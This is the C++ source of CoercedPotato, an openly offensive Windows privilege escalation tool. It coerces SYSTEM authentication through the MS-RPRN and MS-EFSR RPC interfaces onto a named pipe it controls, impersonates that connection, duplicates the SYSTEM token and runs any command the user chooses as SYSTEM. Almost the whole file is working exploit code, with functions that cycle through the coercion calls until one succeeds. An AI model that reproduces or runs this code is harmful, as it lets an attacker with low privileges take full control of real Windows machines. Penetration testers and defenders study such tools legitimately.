#pragma once

#include <iostream>
#include <Windows.h>
#include <sddl.h>
#include <userenv.h>
#include <thread>
#include <tchar.h>
#include <string>
#include <locale>
#include <functional>
#include <rpc.h> 
#include <strsafe.h>
#include <winsdkver.h>
#define _WIN32_WINNT 0x0601
#include <sdkddkver.h>


#include "ms-srvsvc_h.h"
#include "ms-efsr_h.h"
#include "ms-rprn_h.h"
#include "ms-par_h.h"
#include "ms-even_h.h"
#include "CoerceFunctions.h"
#include "CLI11.hpp"

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

LPWSTR g_pwszCommandLine = NULL;
BOOL g_bInteractWithConsole = true;

struct NamedPipeThreadArgs {
    LPWSTR commandLine;
    const wchar_t* pipePath;
};


void handleError(long result) {
    wprintf(L"[*] Error code returned : %ld\r\n", result);
    if (result == 53) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else if (result == 5) {
        wprintf(L" -> [-] Access Denied requiring more privileges, trying another one...\r\n");
    }
    else if (result == 50) {
        wprintf(L" -> [-] RPC function probably not implemented on this system, trying another one...\r\n");
    }
    else if (result == 0) {
        wprintf(L" -> [+] Exploit worked, it should execute your command as SYSTEM!\r\n");
    }
    else {
        wprintf(L" -> [-] Exploit failed, unknown error, trying another function...\r\n");
    }
}

BOOL createRPCbind(RPC_BINDING_HANDLE& binding_h)
{

    RPC_STATUS status;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\localhost";

    RPC_WSTR bindingString = nullptr;
    status = RpcStringBindingCompose(
        nullptr,              // Address targeted (NULL for local binding)
        (RPC_WSTR)L"ncalrpc", // Protocol used 
        nullptr,              // Endpoint (NULL for dynamic binding)
        nullptr,              // UUID (NULL for dynamic binding)
        nullptr,              // Options (utilisez nullptr pour les options par défaut)
        &bindingString
    );

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        return FALSE;
    }

    status = RpcBindingFromStringBinding(bindingString, &binding_h);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        RpcStringFree(&bindingString);
        return FALSE;
    }
    status = RpcStringFree(&bindingString);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
    }
    wprintf(L"[+] RPC binding with localhost done \r\n");
    return TRUE;  // Success
}

// CODE STOLEN FROM https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp
BOOL GetSystem(HANDLE hPipe)
{
    DWORD g_dwSessionId = 0;
    BOOL bResult = FALSE;
    HANDLE hSystemToken = INVALID_HANDLE_VALUE;
    HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    if (!ImpersonateNamedPipeClient(hPipe))
    {
        wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (g_dwSessionId)
    {
        if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
        {
            wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
        goto cleanup;

    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

    if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
    {
        if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
        {
            wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

            RevertToSelf();

            if (!g_bInteractWithConsole)
            {
                if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
                {
                    wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
                    goto cleanup;
                }
                else
                {
                    wprintf(L" ** Exploit completed **\n\n");
                }
            }
            else
            {
                wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
                goto cleanup;
            }
        }
        else
        {
            wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
            goto cleanup;
        }
    }
    else
    {
        wprintf(L" ** Exploit completed **\n\n");
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    bResult = TRUE;

cleanup:
    if (hSystemToken)
        CloseHandle(hSystemToken);
    if (hSystemTokenDup)
        CloseHandle(hSystemTokenDup);
    if (pwszCurrentDirectory)
        free(pwszCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return bResult;
}

DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
    NamedPipeThreadArgs* args = static_cast<NamedPipeThreadArgs*>(lpParam);
    LPWSTR commandLine = args->commandLine;
    const wchar_t* pipePath = args->pipePath;

    HANDLE hPipe = INVALID_HANDLE_VALUE;
    HANDLE hTokenDup = INVALID_HANDLE_VALUE;
    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };
    HANDLE hToken = ((HANDLE)(LONG_PTR)-1);
    LPWSTR lpName;

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintfW(lpName, MAX_PATH, pipePath);


    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
    {
        wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
    {
        wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
        return -1;
    }

    if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
    {
        wprintf(L"[PIPESERVER] Named pipe '%ls' listening...\n\n", lpName);
        ConnectNamedPipe(hPipe, NULL);
        wprintf(L"\n[PIPESERVER] A client connected!\n\n");
        if (!GetSystem(hPipe)) {
            wprintf(L"[PIPESERVER] CreateNamedPipe() failed. Error: %d - ", GetLastError());
        }
    }
    return 0;
}

BOOL createNamedPipe(wchar_t* namedpipe, wchar_t* commandExecuted) {
    HANDLE hThread = NULL;
    NamedPipeThreadArgs poisonedNamedPipe;
    poisonedNamedPipe.pipePath = namedpipe;
    poisonedNamedPipe.commandLine = commandExecuted;
    hThread = CreateThread(NULL, 0, launchNamedPipeServer, &poisonedNamedPipe, 0, NULL);
    wprintf(L"[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe %s.\r\n", poisonedNamedPipe.pipePath);
    return TRUE;
}

long CallEfsrFunctions(RPC_BINDING_HANDLE Binding, int exploitID, bool force)
{
    wprintf(L"[MS-EFSR] [*] Attempting MS-EFSR functions...\r\n\n");
    long result;

    LPWSTR targetedPipeName;
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced\\C$\\\x00");

    std::function<int()> functions[] = {
        [&]() { return callEfsRpcOpenFileRaw(Binding, targetedPipeName); },
        [&]() { return callEfsRpcEncryptFileSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcDecryptFileSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryUsersOnFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryRecoveryAgents(Binding, targetedPipeName); },
        [&]() { return callEfsRpcRemoveUsersFromFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcAddUsersToFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcFileKeyInfo(Binding, targetedPipeName); },
        [&]() { return callEfsRpcDuplicateEncryptionInfoFile(Binding, targetedPipeName); },
        [&]() { return callEfsRpcAddUsersToFileEx(Binding, targetedPipeName); },
        [&]() { return callEfsRpcFileKeyInfoEx(Binding, targetedPipeName); },
        [&]() { return callEfsRpcGetEncryptedFileMetadata(Binding, targetedPipeName); },
        [&]() { return callEfsRpcEncryptFileExSrv(Binding, targetedPipeName); },
        [&]() { return callEfsRpcQueryProtectors(Binding, targetedPipeName); }
    };
    int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
    if (exploitID == -1) {
        wprintf(L"[MS-EFSR] Starting RPC functions fuzzing...\r\n");
        for (int i = 0; i < sizeOfFunctions; i++) {
            wprintf(L" [MS-EFSR] ");
            result = functions[i]();
            wprintf(L" [MS-EFSR] ");
            handleError(result);
            if (result == 53 and !force) {
                LocalFree(targetedPipeName);
                return 0;
            }
        }
    }
    else {
        wprintf(L"[MS-EFSR] ");
        result = functions[exploitID]();
        wprintf(L"[MS-EFSR] ");
        handleError(result);
    }

    LocalFree(targetedPipeName);
    return -1;
}


long callRprnFunctions(int exploitID, bool force) {
    wprintf(L"[MS-RPRN] [*] Attempting MS-RPRN functions...\r\n\n");
    long result;

    LPWSTR targetedPipeName;
    targetedPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(targetedPipeName, MAX_PATH, L"\\\\127.0.0.1/pipe/coerced");


    std::function<int()> functions[] = {
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotificationEx(targetedPipeName); },
        [&]() { return callRpcRemoteFindFirstPrinterChangeNotification(targetedPipeName);
    } };
    int sizeOfFunctions = sizeof(functions) / sizeof(functions[0]);
    if (exploitID == -1) {
        wprintf(L"[MS-RPRN] Starting RPC functions fuzzing...\r\n");
        for (int i = 0; i < sizeOfFunctions; i++) {
            wprintf(L" [MS-RPRN] ");
            result = functions[i]();
            wprintf(L" [MS-RPRN] ");
            handleError(result);
            if (result == 0 and !force) {
                LocalFree(targetedPipeName);
                return 0;
            }
        }
    }
    else {
        wprintf(L"[MS-RPRN] ");
        result = functions[exploitID]();
        wprintf(L"[MS-RPRN] ");
        handleError(result);
    }

    LocalFree(targetedPipeName);
    if (!force) {
        wprintf(L"[MS-RPRN] None of MS-RPRN worked... \r\n\n\n");
    }
    return -1;
}

BOOL exploitMsEfsr(wchar_t* command, int exploitId, bool force) {
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\srvsvc");

    if (!createNamedPipe(namedpipe, command)) {
        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
        return FALSE;
    }

    Sleep(500);

    handle_t RPCBind;
    if (!createRPCbind(RPCBind)) {
        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
        return FALSE;
    }
    Sleep(500);
    long result;
    result = CallEfsrFunctions(RPCBind, exploitId, force) == 0;
    return result;
}

BOOL exploitMsRprn(wchar_t* command, int exploitId, bool force) {
    long result;
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\coerced\\pipe\\spoolss");
    if (!createNamedPipe(namedpipe, command)) {
        wprintf(L"[PIPESERVER] An error has occurred while creating the pipe server\r\n");
        return FALSE;
    }
    Sleep(500);
    return callRprnFunctions(exploitId, force) == 0;
}


void exploitAll(wchar_t* command, int exploitId, bool force) {
    wprintf(L"[+] RUNNING ALL KNOWN EXPLOITS.\r\n\n");
    BOOL stopFuzzing = FALSE;
    if (!stopFuzzing){
        stopFuzzing=exploitMsRprn(command, exploitId, force);
    }
    if (!stopFuzzing or force){
        stopFuzzing=exploitMsEfsr(command, exploitId, force);
    }
}

BOOL createRPCbind_for_mspar(RPC_BINDING_HANDLE& binding_h)
{

    RPC_STATUS status;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\localhost";

    RPC_WSTR bindingString = nullptr;
    status = RpcStringBindingCompose(
        nullptr,              // Address targeted (NULL for local binding)
        (RPC_WSTR)L"ncalrpc", // Protocol used 
        nullptr,              // Endpoint (NULL for dynamic binding)
        nullptr,              // UUID (NULL for dynamic binding)
        nullptr,              // Options (utilisez nullptr pour les options par défaut)
        &bindingString
    );

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        return FALSE;
    }

    status = RpcBindingFromStringBinding(bindingString, &binding_h);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
        RpcStringFree(&bindingString);
        return FALSE;
    }
    status = RpcStringFree(&bindingString);

    if (status != RPC_S_OK) {
        std::cerr << "[-] An error has occurred during the binding : " << status << std::endl;
    }
    wprintf(L"[+] RPC binding with localhost done \r\n\n");
    return TRUE;  // Success
}

int main(int argc, char** argv)
{
    /*
    // TENTATIVE AVEC MS-EVEN 
    // TENTATIVE AVEC MS-EVEN 
    NTSTATUS status;
    EVENTLOG_HANDLE_W UNCServerName = NULL;  // Remplacez par le nom du serveur UNC approprié
    RPC_UNICODE_STRING BackupFileName;

    wchar_t backupPath[] = L"\\??\\UNC\\SRV01\\pipe\\foo123\x00";
    BackupFileName.Length = (USHORT)(wcslen(backupPath) * sizeof(wchar_t));
    BackupFileName.MaximumLength = BackupFileName.Length + sizeof(wchar_t);  // Assurez-vous d'inclure le caractère nul
    BackupFileName.Buffer = backupPath;

    // Initialiser la chaîne avec "\\??\\UNC\\localhost/pipe/poool2"

    unsigned long MajorVersion = 1; // Spécifiez la version majeure
    unsigned long MinorVersion = 1; // Spécifiez la version mineure
    IELF_HANDLE LogHandle = NULL; // Initialisez le pointeur à NULL

    // Appeler ElfrOpenBELW
    wprintf(L"Calling ElfrOpenBELW() to coerce authentication to %ls\r\n\n", backupPath);
    status = ElfrOpenBELW(
        UNCServerName,
        &BackupFileName,
        MajorVersion,
        MinorVersion,
        &LogHandle
    );

    if (status != ERROR_SUCCESS) {
        std::cerr << "Attack probably worked !\n\n" << std::endl;
        // Gérer l'erreur selon vos besoins.
    }
    else {
        // Traitement avec LogHandle selon vos besoins.
    }

    return 0;
    */

    /*
    // TENTATIVE AVEC MS-PAR
    handle_t RPCBind;
    if (!createRPCbind(RPCBind)) {
        wprintf(L"[RPCBIND] An error has occurred during the RPC binding \r\n");
        return FALSE;
    }
    wchar_t* namedpipe;
    namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(namedpipe, MAX_PATH, L"\\\\localhost/pipe/poool2");
    callNetprPathType(namedpipe);
    return 0;
    


    long result = callRpcAsyncOpenPrinter(RPCBind, namedpipe);
    */
    
    std::cout << "                                                                  " << std::endl;
    std::cout << "   ____                            _ ____       _        _        " << std::endl;
    std::cout << "  / ___|___   ___ _ __ ___ ___  __| |  _ \\ ___ | |_ __ _| |_ ___  " << std::endl;
    std::cout << " | |   / _ \\ / _ \\ '__/ __/ _ \\/ _` | |_) / _ \\| __/ _` | __/ _ \\ " << std::endl;
    std::cout << " | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |" << std::endl;
    std::cout << "  \\____\\___/ \\___|_|  \\___\\___|\\__,_|_|   \\___/ \\__\\__,_|\\__\\___/ " << std::endl;
    std::cout << "                                                                  " << std::endl;
    std::cout << "                                           @Hack0ura @Prepouce    " << std::endl;
    std::cout << "                                                                  " << std::endl;


    CLI::App app{ "CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken." };

    if (argc == 1) {
        wprintf(L"Use --help to show all usefull information.\r\n");
        wprintf(L"[-] Exiting...\r\n");
        exit(0);
    }

    std::string stringCommand;

    app.add_option("-c,--command", stringCommand, "Program to execute as SYSTEM (i.e. cmd.exe)")->required();

    std::string rpcInterface;
    app.add_option("-i,--interface", rpcInterface, "Optionnal interface to use (default : ALL) (Possible values : ms-rprn, ms-efsr");

    int exploitId = -1;
    app.add_option("-n,--exploitId", exploitId, "Optionnal exploit ID (Only usuable if interface is defined) \n -> ms-rprn : \n   [0] RpcRemoteFindFirstPrinterChangeNotificationEx()\n   [1] RpcRemoteFindFirstPrinterChangeNotification()\n -> ms-efsr \n   [0] EfsRpcOpenFileRaw()\n   [1] EfsRpcEncryptFileSrv()\n   [2] EfsRpcDecryptFileSrv()\n   [3] EfsRpcQueryUsersOnFile()\n   [4] EfsRpcQueryRecoveryAgents()\n   [5] EfsRpcRemoveUsersFromFile()\n   [6] EfsRpcAddUsersToFile()\n   [7] EfsRpcFileKeyInfo() # NOT WORKING\n   [8] EfsRpcDuplicateEncryptionInfoFile()\n   [9] EfsRpcAddUsersToFileEx()\n   [10] EfsRpcFileKeyInfoEx() # NOT WORKING\n   [11] EfsRpcGetEncryptedFileMetadata()\n   [12] EfsRpcEncryptFileExSrv()\n   [13] EfsRpcQueryProtectors()\n");

    bool force = false;
    app.add_option("-f,--force", force, "Force all RPC functions even if it says 'Exploit worked!' (Default value : false)");

    bool interactive = true;
    app.add_option("--interactive", interactive, "Set wether the process should be run within the same shell or open a new window. (Default value : true)");


    CLI11_PARSE(app, argc, argv);

    const char* charPointer = stringCommand.c_str();
    size_t maxBufferSize = stringCommand.size() + 1;
    wchar_t* command = new wchar_t[maxBufferSize];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);

    g_pwszCommandLine = command;
    g_bInteractWithConsole = interactive;

    if (rpcInterface.empty() and exploitId != -1) {
        wprintf(L"%d\n", exploitId);
        wprintf(L"Please use rpcInterface parameter before defining exploitId. \r\n");
        wprintf(L"[-] Exiting...\r\n");
        exit(0);
    }

    if (rpcInterface.empty() and exploitId == -1) {
        exploitAll(command, exploitId, force);
        return 0;
    }
    else {
        if (rpcInterface == "ms-rprn") {
            exploitMsRprn(command, exploitId, force);
        }
        else if (rpcInterface == "ms-efsr") {
            exploitMsEfsr(command, exploitId, force);
        }
    }

    return 0;
    
}



/** ALL FUNCTIONS USEFUL FOR RPC INTERFACES **/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

// Taken from https://github.com/leechristensen/SpoolSample/blob/master/MS-RPRN/main.cpp 
handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
    RPC_STATUS RpcStatus;
    RPC_WSTR StringBinding;
    handle_t BindingHandle;
    WCHAR   ServerName[MAX_PATH + 1];
    DWORD   i;

    if (lpStr && lpStr[0] == L'\\' && lpStr[1] == L'\\') {
        ServerName[0] = ServerName[1] = '\\';

        i = 2;
        while (lpStr[i] && lpStr[i] != L'\\' && i < sizeof(ServerName)) {
            ServerName[i] = lpStr[i];
            i++;
        }

        ServerName[i] = 0;
    }
    else {
        return FALSE;
    }

    RpcStatus = RpcStringBindingComposeW(
        (RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB",
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)ServerName,
        (RPC_WSTR)L"\\pipe\\spoolss",
        NULL,
        &StringBinding);

    if (RpcStatus != RPC_S_OK) {
        return(0);
    }

    RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

    RpcStringFreeW(&StringBinding);

    if (RpcStatus != RPC_S_OK) {
        wprintf(L"[-] An error has occurred during STRING_HANDLE_bind()...\r\n");
        return(0);
    }

    return(BindingHandle);
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
    RPC_STATUS       RpcStatus;

    RpcStatus = RpcBindingFree(&BindingHandle);
    if (RpcStatus == RPC_S_INVALID_BINDING) wprintf(L"[-] An error has occurred during STRING_HANDLE_unbind()...\r\n");

    return;
}

handle_t __RPC_USER SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
{
    handle_t hBinding = NULL;
    RPC_WSTR pszStringBinding;
    long status;

    wprintf(L"SRVSVC_HANDLE_bind() called\n");

    status = RpcStringBindingComposeW(NULL,(RPC_WSTR) L"ncacn_np", (RPC_WSTR)pszSystemName, (RPC_WSTR) L"\\pipe\\srvsvc", NULL, &pszStringBinding);

    
    if (status)
    {
        wprintf(L"RpcStringBindingCompose returned %ld\n", status);
        return NULL;
    }

    /* Set the binding handle that will be used to bind to the server. */
    status = RpcBindingFromStringBindingW(pszStringBinding,
        &hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFromStringBinding returned %ld\n", status);
    }

    status = RpcStringFreeW(&pszStringBinding);
    if (status)
    {
        //        TRACE("RpcStringFree returned 0x%x\n", status);
    }

    return hBinding;
}


void __RPC_USER
SRVSVC_HANDLE_unbind(SRVSVC_HANDLE pszSystemName,
    handle_t hBinding)
{
    RPC_STATUS status;

    wprintf(L"SRVSVC_HANDLE_unbind() called\n");

    status = RpcBindingFree(&hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFree returned 0x%x\n", status);
    }
}


handle_t __RPC_USER
EVENTLOG_HANDLE_A_bind(EVENTLOG_HANDLE_A UNCServerName)
{
    handle_t hBinding = NULL;
    RPC_CSTR pszStringBinding;
    RPC_STATUS status;


    status = RpcStringBindingComposeA(NULL,
        (RPC_CSTR)"ncacn_np",
        (RPC_CSTR)UNCServerName,
        (RPC_CSTR)"\\pipe\\EventLog",
        NULL,
        &pszStringBinding);
    if (status)
    {
        return NULL;
    }

    /* Set the binding handle that will be used to bind to the server. */
    status = RpcBindingFromStringBindingA(pszStringBinding,
        &hBinding);

    status = RpcStringFreeA(&pszStringBinding);

    return hBinding;
}


void __RPC_USER
EVENTLOG_HANDLE_A_unbind(EVENTLOG_HANDLE_A UNCServerName,
    handle_t hBinding)
{
    RPC_STATUS status;

    status = RpcBindingFree(&hBinding);
}


handle_t __RPC_USER
EVENTLOG_HANDLE_W_bind(EVENTLOG_HANDLE_W UNCServerName)
{
    handle_t hBinding = NULL;
    RPC_WSTR pszStringBinding;
    RPC_STATUS status;

    status = RpcStringBindingComposeW(NULL,
        (RPC_WSTR) L"ncacn_np",
        (RPC_WSTR) UNCServerName,
        (RPC_WSTR) L"\\pipe\\EventLog",
        NULL,
        &pszStringBinding);
    if (status != RPC_S_OK)
    {
        return NULL;
    }

    /* Set the binding handle that will be used to bind to the server. */
    status = RpcBindingFromStringBindingW(pszStringBinding,
        &hBinding);

    status = RpcStringFreeW(&pszStringBinding);

    return hBinding;
}


void __RPC_USER
EVENTLOG_HANDLE_W_unbind(EVENTLOG_HANDLE_W UNCServerName,
    handle_t hBinding)
{
    RPC_STATUS status;

    status = RpcBindingFree(&hBinding);
}